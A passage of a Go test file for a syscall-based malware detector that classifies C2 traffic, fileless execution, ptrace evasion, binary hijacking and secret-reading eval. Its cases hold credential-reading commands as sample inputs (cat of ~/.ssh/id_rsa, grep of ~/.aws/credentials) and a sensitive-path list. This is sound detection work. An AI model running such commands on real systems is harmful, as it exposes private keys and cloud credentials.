		{Syscall: types.EventConnect, DstAddr: "1.1.1.1", DstPort: 53, Family: 2},
	}
	_, filtered := Analyze(events)
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	// Should be C2, not DNS tunnel (port 53 connect is already suspicious).
	if filtered[0].Category != types.CategoryC2 {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryC2)
	}
}

func TestIsKnownDoHServer(t *testing.T) {
	known := []string{"1.1.1.1", "8.8.8.8", "9.9.9.9", "208.67.222.222"}
	for _, ip := range known {
		if !isKnownDoHServer(ip) {
			t.Errorf("expected %s to be known DoH server", ip)
		}
	}
	if isKnownDoHServer("203.0.113.50") {
		t.Error("random IP should not be DoH server")
	}
}

// ---------------------------------------------------------------------------
// /dev/shm execution detection
// ---------------------------------------------------------------------------

func TestAnalyze_DevShmExecution(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/dev/shm/payload", Cmdline: "/dev/shm/payload --exfil"},
	}
	verdict, filtered := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for /dev/shm exec, got %s", verdict)
	}
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if !strings.Contains(filtered[0].Reason, "fileless") {
		t.Errorf("reason should mention fileless, got %q", filtered[0].Reason)
	}
}

func TestAnalyze_ProcSelfFdExecution(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/proc/self/fd/3", Cmdline: "/proc/self/fd/3"},
	}
	verdict, filtered := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for /proc/self/fd exec, got %s", verdict)
	}
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
}

func TestAnalyze_DevShmBenignBinaryName(t *testing.T) {
	// Even if the binary is named "python3", /dev/shm is never allowed.
	events := []types.SyscallEvent{
		{Syscall: types.EventExecve, Comm: "/dev/shm/python3", Cmdline: "python3 setup.py"},
	}
	verdict, _ := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for /dev/shm/python3, got %s", verdict)
	}
}

func TestSetSensitivePaths(t *testing.T) {
	orig := sensitivePathPatterns
	defer func() { sensitivePathPatterns = orig }()

	SetSensitivePaths([]string{"/.custom-secret/"})
	if len(sensitivePathPatterns) != 1 || sensitivePathPatterns[0] != "/.custom-secret/" {
		t.Errorf("SetSensitivePaths did not update patterns: %v", sensitivePathPatterns)
	}
}

func TestArgsTouchSensitivePath(t *testing.T) {
	orig := sensitivePathPatterns
	defer func() { sensitivePathPatterns = orig }()
	SetSensitivePaths([]string{"/.ssh/", "/.aws/"})

	cases := []struct {
		name    string
		segment string
		want    bool
	}{
		{"cat ssh key", "cat /home/dev/.ssh/id_rsa", true},
		{"grep aws creds", "grep -r . /home/dev/.aws/credentials", true},
		{"head git creds", "head /home/dev/.aws/config", true},
		{"benign cat", "cat /etc/hosts", false},
		{"flag only", "ls -la", false},
		{"no args", "ls", false},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := argsTouchSensitivePath(tc.segment)
			if got != tc.want {
				t.Errorf("argsTouchSensitivePath(%q) = %v, want %v", tc.segment, got, tc.want)
			}
		})
	}
}

func TestAnalyze_ShellCmdSensitivePath(t *testing.T) {
	orig := sensitivePathPatterns
	defer func() { sensitivePathPatterns = orig }()
	SetSensitivePaths([]string{"/.ssh/", "/.aws/"})

	events := []types.SyscallEvent{
		{
			Syscall: types.EventExecve,
			Comm:    "/bin/sh",
			Cmdline: "sh -c cat /home/dev/.ssh/id_rsa",
		},
	}
	verdict, filtered := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for shell cmd accessing .ssh, got %s", verdict)
	}
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryCodeExecution {
		t.Errorf("expected category %q, got %q", types.CategoryCodeExecution, filtered[0].Category)
	}
}

func TestAnalyze_PtraceTraceme(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventPtrace, Comm: "ptrace(PTRACE_TRACEME)"},
	}
	verdict, filtered := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("expected suspicious for ptrace, got %s", verdict)
	}
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryEvasion {
		t.Errorf("expected category %q, got %q", types.CategoryEvasion, filtered[0].Category)
	}
}

func TestGenerateSummary_Evasion(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventPtrace, Category: types.CategoryEvasion},
	}
	summary := GenerateSummary(types.VerdictSuspicious, events)
	if summary.RiskLevel != riskHigh {
		t.Errorf("expected risk %q for evasion, got %q", riskHigh, summary.RiskLevel)
	}
	if !strings.Contains(summary.Description, "anti-debugging") {
		t.Errorf("expected description to mention anti-debugging, got %q", summary.Description)
	}
}

func TestIsSystemBinaryTarget(t *testing.T) {
	tests := []struct {
		path string
		want bool
	}{
		{"/usr/local/bin/python3", true},
		{"/usr/local/bin/node", true},
		{"/usr/bin/sh", true},
		{"/usr/local/bin/pip", true},
		{"/bin/bash", true},
		{"/sbin/env", true},
		{"/usr/local/bin/black", false},
		{"/usr/local/bin/pytest", false},
		{"/tmp/python3", false},
		{"/home/dev/node", false},
	}
	for _, tt := range tests {
		got := isSystemBinaryTarget(tt.path)
		if got != tt.want {
			t.Errorf("isSystemBinaryTarget(%q) = %v, want %v", tt.path, got, tt.want)
		}
	}
}

func TestClassify_OpenatSystemBinaryWrite(t *testing.T) {
	evt := types.SyscallEvent{
		Syscall:   types.EventOpenat,
		FilePath:  "/usr/local/bin/python3",
		OpenFlags: "O_WRONLY|O_CREAT|O_TRUNC",
	}
	classify(&evt)
	if evt.Category != types.CategoryBinaryHijack {
		t.Errorf("category = %q, want %q", evt.Category, types.CategoryBinaryHijack)
	}
	if !strings.Contains(evt.Reason, "trusted system binary") {
		t.Errorf("reason should mention trusted system binary, got %q", evt.Reason)
	}
}

func TestClassify_OpenatSystemBinaryReadNotHijack(t *testing.T) {
	evt := types.SyscallEvent{
		Syscall:   types.EventOpenat,
		FilePath:  "/usr/local/bin/python3",
		OpenFlags: "O_RDONLY|O_CLOEXEC",
	}
	classify(&evt)
	// Read should NOT be classified as binary hijack.
	if evt.Category == types.CategoryBinaryHijack {
		t.Error("read from system binary should not be binary_hijacking")
	}
}

func TestClassify_DynamicExec(t *testing.T) {
	evt := types.SyscallEvent{
		Syscall:     types.EventDynamicExec,
		AuditEvent:  "eval",
		CodeSnippet: "process.env.GITHUB_TOKEN",
	}
	classify(&evt)
	if evt.Category != types.CategoryDynamicExec {
		t.Errorf("category = %q, want %q", evt.Category, types.CategoryDynamicExec)
	}
	if !strings.Contains(evt.Reason, "audit hook") {
		t.Errorf("reason should mention audit hook, got %q", evt.Reason)
	}
}

func TestAnalyze_DynamicExecNotFiltered(t *testing.T) {
	events := []types.SyscallEvent{
		{
			Timestamp:   time.Now(),
			Syscall:     types.EventDynamicExec,
			AuditEvent:  "Function",
			CodeSnippet: "return process.env.AWS_SECRET_ACCESS_KEY",
		},
	}
	verdict, filtered := Analyze(events)
	if verdict != types.VerdictSuspicious {
		t.Errorf("verdict = %q, want suspicious", verdict)
	}
	if len(filtered) != 1 {
		t.Fatalf("expected 1 event, got %d", len(filtered))
	}
	if filtered[0].Category != types.CategoryDynamicExec {
		t.Errorf("category = %q, want %q", filtered[0].Category, types.CategoryDynamicExec)
	}
}

func TestBuildBreakdown_OrderAndContent(t *testing.T) {
	events := []types.SyscallEvent{
		{Category: types.CategoryC2},
		{Category: types.CategoryC2},
		{Category: types.CategoryMemExec},
		{Category: types.CategoryMemExec},
		{Category: types.CategoryMemExec},
		{Category: types.CategoryEvasion},
		{Category: ""}, // ignored
	}
	got := buildBreakdown(events)

	if len(got) != 3 {
		t.Fatalf("expected 3 categories, got %d: %+v", len(got), got)
	}

	// Sorted by count desc, then alphabetical: memory_execution(3) > c2_communication(2) > evasion(1).
	if got[0].Category != types.CategoryMemExec || got[0].Count != 3 {
		t.Errorf("first hit = %+v, want memory_execution=3", got[0])
	}
	if got[1].Category != types.CategoryC2 || got[1].Count != 2 {
		t.Errorf("second hit = %+v, want c2_communication=2", got[1])
	}
	if got[2].Category != types.CategoryEvasion || got[2].Count != 1 {
		t.Errorf("third hit = %+v, want evasion=1", got[2])
	}

	// Each hit should carry a non-empty short description for the CLI.
	for _, h := range got {
		if h.Description == "" {
			t.Errorf("category %s missing short description", h.Category)
		}
	}
}

func TestBuildBreakdown_TieBreakerAlphabetical(t *testing.T) {
	events := []types.SyscallEvent{
		{Category: types.CategoryEvasion},
		{Category: types.CategoryC2},
	}
	got := buildBreakdown(events)
	if len(got) != 2 {
		t.Fatalf("expected 2 categories, got %d", len(got))
	}
	// Equal counts (1 each) — tie broken alphabetically: c2 < evasion.
	if got[0].Category != types.CategoryC2 {
		t.Errorf("first should be c2_communication on alphabetical tie, got %s", got[0].Category)
	}
}

func TestBuildBreakdown_NoEvents(t *testing.T) {
	if got := buildBreakdown(nil); got != nil {
		t.Errorf("nil events should produce nil breakdown, got %+v", got)
	}
	if got := buildBreakdown([]types.SyscallEvent{{Category: ""}}); got != nil {
		t.Errorf("category-less events should produce nil breakdown, got %+v", got)
	}
}

func TestCategoryShortDesc(t *testing.T) {
	// Every Category constant in types.go should have a short desc.
	cats := []string{
		types.CategoryC2, types.CategoryDataExfil, types.CategoryCredentialAccess,
		types.CategoryCodeExecution, types.CategoryBinaryHijack, types.CategoryBackdoor,
		types.CategoryPersistence, types.CategoryDNSTunnel, types.CategoryEvasion,
		types.CategoryMemExec, types.CategoryAntiForensics, types.CategoryDynamicExec,
	}
	for _, c := range cats {
		if got := categoryShortDesc(c); got == "" || got == c {
			t.Errorf("category %s lacks a distinct short description (got %q)", c, got)
		}
	}
}

func TestGenerateSummary_PopulatesBreakdown(t *testing.T) {
	events := []types.SyscallEvent{
		{Category: types.CategoryC2, Comm: "evil", DstAddr: "1.1.1.1", DstPort: 443, Syscall: types.EventConnect},
		{Category: types.CategoryC2, Comm: "evil", DstAddr: "1.1.1.1", DstPort: 443, Syscall: types.EventConnect},
		{Category: types.CategoryMemExec, Syscall: types.EventMmap},
	}
	summary := GenerateSummary(types.VerdictSuspicious, events)
	if summary == nil {
		t.Fatal("GenerateSummary returned nil")
	}
	if len(summary.Breakdown) != 2 {
		t.Errorf("breakdown length = %d, want 2", len(summary.Breakdown))
	}
	// Breakdown should NOT replace Description — both must be present
	// for back-compat with JSON consumers.
	if summary.Description == "" {
		t.Error("Description must remain populated for back-compat")
	}
}

// TestGenerateSummary_RemediationPriority verifies that when multiple
// remediation tiers apply, the highest-severity message always wins —
// regardless of map iteration order. The previous implementation walked
// the categories slice and returned on first match, so the message text
// flipped between runs.
func TestGenerateSummary_RemediationPriority(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventConnect, DstAddr: "203.0.113.50", DstPort: 443, Category: types.CategoryC2},
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.ssh/id_rsa", Category: types.CategoryCredentialAccess},
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.bashrc", Category: types.CategoryPersistence},
	}
	const want = "audit the host for compromised credentials"

	// Repeat to amortise Go's map iteration randomness — a single call
	// could pass even when the priority logic is broken.
	for i := 0; i < 50; i++ {
		s := GenerateSummary(types.VerdictSuspicious, events)
		if !strings.Contains(s.Remediation, want) {
			t.Fatalf("iteration %d: expected high-severity remediation containing %q, got %q",
				i, want, s.Remediation)
		}
	}
}

// TestGenerateSummary_DeterministicOrder verifies that Categories,
// Description, and Remediation are stable across repeated calls with
// identical input. Without the sort step in GenerateSummary, map
// iteration order would scramble Categories and the joined Description
// text run-to-run, polluting JSON diffs and demo recordings.
func TestGenerateSummary_DeterministicOrder(t *testing.T) {
	events := []types.SyscallEvent{
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.bashrc", Category: types.CategoryPersistence},
		{Syscall: types.EventConnect, DstAddr: "203.0.113.50", DstPort: 443, Category: types.CategoryC2},
		{Syscall: types.EventOpenat, FilePath: "/home/dev/.ssh/id_rsa", Category: types.CategoryCredentialAccess},
	}

	wantCats := []string{
		types.CategoryC2,
		types.CategoryCredentialAccess,
		types.CategoryPersistence,
	}
	sort.Strings(wantCats)

	first := GenerateSummary(types.VerdictSuspicious, events)
	if !reflect.DeepEqual(first.Categories, wantCats) {
		t.Errorf("Categories = %v, want sorted %v", first.Categories, wantCats)
	}

	for i := 0; i < 50; i++ {
		s := GenerateSummary(types.VerdictSuspicious, events)
		if !reflect.DeepEqual(s.Categories, first.Categories) {
			t.Fatalf("iteration %d: Categories changed from %v to %v",
				i, first.Categories, s.Categories)
		}
		if s.Description != first.Description {
			t.Fatalf("iteration %d: Description changed from %q to %q",
				i, first.Description, s.Description)
		}
		if s.Remediation != first.Remediation {
			t.Fatalf("iteration %d: Remediation changed from %q to %q",
				i, first.Remediation, s.Remediation)
		}
	}
}
